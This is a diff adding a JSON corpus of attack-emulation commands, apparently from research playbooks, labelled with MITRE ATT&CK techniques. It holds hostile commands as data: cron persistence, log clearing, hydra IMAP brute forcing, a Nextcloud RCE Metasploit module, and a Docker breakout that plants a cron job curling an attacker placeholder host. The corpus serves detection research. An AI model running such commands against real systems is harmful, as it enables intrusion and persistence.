+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "*/10 * * * * /home/judy/downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "*/5 * * * * /bin/bash -c /home/judy/.index"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1070.003"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "history -c"
+    }
+   ]
+  },
+  "scenario_6_c.j2": {
+   "scenario": "S6",
+   "source_path": "scenario_6_c.j2",
+   "source_sha256": "4b5ef9c39b5bd3f4206a1c91f2da08b7941fbd3496ce9f8357dfb5da7c24f26b",
+   "n_unlabelled_commands": 41,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1176",
+      "T1056.001",
+      "T1056.004",
+      "T1115"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "webserv",
+     "cmd": ""
+    },
+    {
+     "techniques": [
+      "T1176",
+      "T1056.001",
+      "T1056.004",
+      "T1115"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1176",
+      "T1056.001",
+      "T1056.004",
+      "T1115"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1176",
+      "T1056.001",
+      "T1056.004",
+      "T1115"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1176",
+      "T1056.001",
+      "T1056.004",
+      "T1115"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1176",
+      "T1056.001",
+      "T1056.004",
+      "T1115"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "vnc",
+     "cmd": "move"
+    },
+    {
+     "techniques": [
+      "T1176",
+      "T1056.001",
+      "T1056.004",
+      "T1115"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1176",
+      "T1056.001",
+      "T1056.004",
+      "T1115"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "vnc",
+     "cmd": "move"
+    },
+    {
+     "techniques": [
+      "T1176",
+      "T1056.001",
+      "T1056.004",
+      "T1115"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1056.001"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1056.001"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1056.004",
+      "T1056.001"
+     ],
+     "tactics": [
+      "Collection",
+      "Credential Access"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1056.004",
+      "T1056.001"
+     ],
+     "tactics": [
+      "Collection",
+      "Credential Access"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1056.004"
+     ],
+     "tactics": [
+      "Collection",
+      "Credential Access"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1115"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "move"
+    },
+    {
+     "techniques": [
+      "T1115"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    }
+   ]
+  },
+  "scenario_7.j2": {
+   "scenario": "S7",
+   "source_path": "scenario_7.j2",
+   "source_sha256": "ffefe48c592452a26e09cc9e73090be5f5547037599fa45f7b0bb22893494bca",
+   "n_unlabelled_commands": 13,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver 192.42.0.233 $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1589.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "./smtp-user-enum.pl  -M VRFY -U smtp-user.txt -t $MAIL_HOST"
+    },
+    {
+     "techniques": [
+      "T1078.002",
+      "T1110.001",
+      "T1133"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "shell",
+     "cmd": "hydra -l \"alice@$DOMAIN\" -P smtp-pass.txt -c 5 -s 143 $MAIL_HOST imap"
+    },
+    {
+     "techniques": [
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "http-client",
+     "cmd": ""
+    },
+    {
+     "techniques": [
+      "T1071.001",
+      "T1573.001"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sliver",
+     "cmd": "start_https_listener"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.004",
+      "T1095"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/nextcloud_workflows_rce"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "getuid"
+    },
+    {
+     "techniques": [
+      "T1057"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "shell",
+     "cmd": "docker -H tcp://localhost:1090 ps"
+    },
+    {
+     "techniques": [
+      "T1016"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "shell",
+     "cmd": "docker -H tcp://localhost:1090 network list"
+    },
+    {
+     "techniques": [
+      "T1610",
+      "T1525",
+      "T1053.003",
+      "T1210"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Execution",
+      "Persistence",
+      "Privilege Escalation",
+      "Lateral Movement"
+     ],
+     "type": "shell",
+     "cmd": "docker -H tcp://localhost:1090 run --rm -t -u root --network=nextcloud_default -v /etc:/root/etc  kalilinux/kali-rolling bash -c \"echo \\\"*/5 * * * * root test -e /opt/tool || curl http://$ATTACKER_ADD"
+    },
+    {
+     "techniques": [
+      "T1083"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "ls"
+    },
+    {
+     "techniques": [
+      "T1057"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "ps"
+    },
+    {
+     "techniques": [
+      "T1003.008",
+      "T1041"
+     ],
+     "tactics": [
+      "Credential Access",
+      "Collection",
+      "Exfiltration"
+     ],
+     "type": "sliver-session",
+     "cmd": "download"
+    }
+   ]
+  }
+ },
+ "equality_with_flat_corpus": {
+  "checked": true,
+  "same_run_set": true,
+  "only_in_new": [],
+  "only_in_old": [],
+  "sequence_mismatches": [],
+  "identical": true
+ },
+ "caveats": [
+  "Playbooks contain Jinja2 control flow; the static command list is parsed without rendering, so a rendered run may repeat or skip commands. Counts here are of static annotated commands.",
+  "Unlabelled commands are excluded from the corpus and counted separately. Absence of a label is absence of annotation, not evidence that no technique occurred.",
+  "Technique order inside a command is discarded by design."
+ ]
+}
